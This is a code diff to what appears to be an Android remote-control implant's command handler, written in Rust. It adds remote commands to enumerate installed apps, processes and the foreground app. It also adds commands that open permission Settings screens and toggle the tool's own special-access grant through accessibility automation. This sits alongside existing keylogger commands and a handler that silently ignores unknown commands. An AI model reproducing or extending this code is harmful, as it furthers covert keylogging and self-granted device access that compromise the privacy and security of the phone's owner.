@@ -293,7 +293,21 @@ fn execute_command(cmd: &str, payload: &serde_json::Value) -> Option<String> {
                 Some(android_bridge::a11y_click_text(needle))
             }
         }
-        "apps" | "running" => Some(android_bridge::running_apps()),
+        // `apps` = every installed package: no grant needed, works on any device.
+        // `procs` keeps the ActivityManager view, which Android 8+ restricts to our
+        // own process -- that is why "Running Apps" reported exactly one row.
+        "apps" | "installed" | "pkgs" => Some(android_bridge::installed_apps()),
+        "procs" | "running" => Some(android_bridge::running_apps()),
+        "fgapp" | "foreground" => Some(android_bridge::foreground_app()),
+        // Special-access permissions have no silent API. Native flow: open the
+        // right Settings screen here, then flip our own row via accessibility.
+        "grant_screen" => {
+            let kind = payload.as_str()
+                .or_else(|| payload.get("kind").and_then(|v| v.as_str()))
+                .unwrap_or("allfiles");
+            Some(android_bridge::open_grant_screen(kind))
+        }
+        "toggle_grant" => Some(android_bridge::toggle_grant()),
         "keylog_file" => Some(cmd_keylog_file()),
         "keylog_list" => Some(cmd_keylog_list()),
         _ => None, // Unknown command — don't respond
